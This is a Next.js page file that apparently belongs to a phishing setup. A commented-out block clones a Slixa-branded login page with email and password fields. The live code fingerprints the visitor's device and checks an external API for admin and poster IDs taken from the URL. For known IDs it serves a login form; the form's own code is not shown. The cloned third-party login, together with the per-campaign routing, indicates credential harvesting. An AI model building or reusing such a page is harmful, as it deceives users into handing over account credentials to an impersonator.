
import { site,API_URL } from "../../../config/index";
import { headers } from 'next/headers'
import LoginForm from "@/app/components/LoginForm";
// export default function page({params}) {
//   const { adminId, posterId } = params;
  
//   return (
//     <div className="">
//     <nav className="bg-[#202020]">
//       <div className=" mx-auto px-2 py-1 ">
//         <div className="flex justify-around">
//           <div className="flex space-x-4 sm:space-x-0">
//             {/* logo  */}
//             <div>
//               <a href="#" className="flex justify-center items-center py-1">
//                 <img
//                   src="/images/slixa-logo_white.svg"
//                   width={120}
//                   height={28}
//                 />
//               </a>
//             </div>

//             {/* <!-- primary nav --> */}
//           </div>

//           <div className="md:flex justify-center items-center hidden">
//             <ul className="flex">
//               <li className="text-[#fff] leading-normal   mr-2 pl-3 pr-3 pt-2 text-sm">
//                 <span>Info</span>
//               </li>
//               <li className="text-[#fff] leading-normal   mr-2 pr-3 pt-2 text-sm">
//                 <span>Pricing</span>
//               </li>
//               <li className="text-[#ffff] leading-normal pt-2   mr-2 pr-3 text-sm ">
//                 <span>Contact</span>
//               </li>
//               <li className="text-[#fff] pr-2 pt-2  text-sm">
//                 <span>Directory</span>
//               </li>
//               <li className="text-[#fff] bg-blue-600 px-2  py-2 ml-3  text-sm rounded">
//                 <span className="">Join!</span>
//               </li>
//             </ul>
//           </div>

//           {/* <!-- mobile button goes here --> */}
//           <div className="md:hidden flex items-center">
//             <button className="mobile-menu-button">
//               <svg
//                 className="w-6 h-6"
//                 xmlns="http://www.w3.org/2000/svg"
//                 fill="none"
//                 viewBox="0 0 24 24"
//                 stroke="currentColor"
//               >
//                 <path
//                   stroke-linecap="round"
//                   stroke-linejoin="round"
//                   stroke-width="2"
//                   d="M4 6h16M4 12h16M4 18h16"
//                 />
//               </svg>
//             </button>
//           </div>
//         </div>
//       </div>

//       {/* <!-- mobile menu --> */}
//       <div className="mobile-menu hidden md:hidden">
//         <a href="#" className="block py-2 px-4 text-sm hover:bg-gray-200">
//           Features
//         </a>
//         <a href="#" className="block py-2 px-4 text-sm hover:bg-gray-200">
//           Pricing
//         </a>
//       </div>
//     </nav>
//     {/* <!-- content goes here --> */}

//     <div className="flex  justify-center items-center ">
//       <section className=" bg-[#f5f5f5]  ">
//         <div className="bg-[#fff]  flex justify-between ">
//           <div className="  pt-5">
//             <h2 className="text-[52px] text-center font-bold text-[#3b3b3b]">
//               Login
//             </h2>

//             <form
//               className="mt-5 border border-gray-100 w-[460px] h-[331px]"
//               action="#"
//               method="POST"
//             >
//               <div className="bg-gray-100 pb-5 border border-gray-100">
//                 <div className="pl-5 pt-5">
//                   <label className="block text-[#505050] uppercase font-semibold text-xs">
//                     Email or Slixa Id
//                   </label>
//                   <input
//                     type="email"
//                     name=""
//                     id=""
//                     value={email}
//                     onChange={(e) => setEmail(e.target.value)}
//                     placeholder="Email address or username"
//                     className="w-[410px] px-1 py-1 rounded mt-2 border placeholder-text-xs border-[#e5e5e5] outline-none"
//                     autoFocus
//                     autoComplete
//                     required
//                   />
//                 </div>

//                 <div className="pl-5 pt-5">
//                   <label className="block text-[#505050] uppercase font-semibold text-xs">
//                     password
//                   </label>
//                   <input
//                     type="password"
//                     name=""
//                     id=""
//                     value={password}
//                     onChange={(e) => setPassword(e.target.value)}
//                     minLength="6"
//                     className="w-[410px] px-1 py-1 rounded mt-2 border border-[#e5e5e5] outline-none "
//                     required
//                   />
//                 </div>
//               </div>

//               <button
//                 onClick={handleSubmit}
//                 type="submit"
//                 className=" block bg-blue-500  text-white font-base text-sm px-3 py-2 mt-5 ml-5 rounded"
//               >
//                 Log In
//               </button>
//               <div className="text-start mt-3">
//                 <a
//                   href="#"
//                   className="text-sm font-base pl-5 
//                   text-[#08c]  
//                    hover:text-gray-700 
//                    hover:underline"
//                 >
//                   Forgot your password?
//                 </a>
//               </div>
//               <div className="text-start ">
//                 <a
//                   href="#"
//                   className="text-sm font-base pl-5 
//                   text-[#08c]  
//                    hover:text-gray-700 
//                    hover:underline"
//                 >
//                   Need an account?
//                 </a>
//               </div>
//             </form>
//           </div>
//         </div>
//       </section>
//     </div>
//   </div>
//   )
// }

export default async function Home({params}) {
  const { adminId, posterId } = params;
  console.log(adminId,posterId)
  const headersList = headers()
  let content;
  const userAgent = headersList.get("user-agent")
  console.log(userAgent)
  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();
  console.log(data)
  if (data?.success !== "exists") {
    
      content= <div className="col-span-12">No Page found!!</div>
    
  }
  if (data?.success == "exists") {
    // content= <div className="col-span-12">Page found!!</div>
    
      content= <LoginForm adminId={adminId} posterId={posterId }/>
    
  }
  return (
    <div>
     {content}
    </div>
  )
}
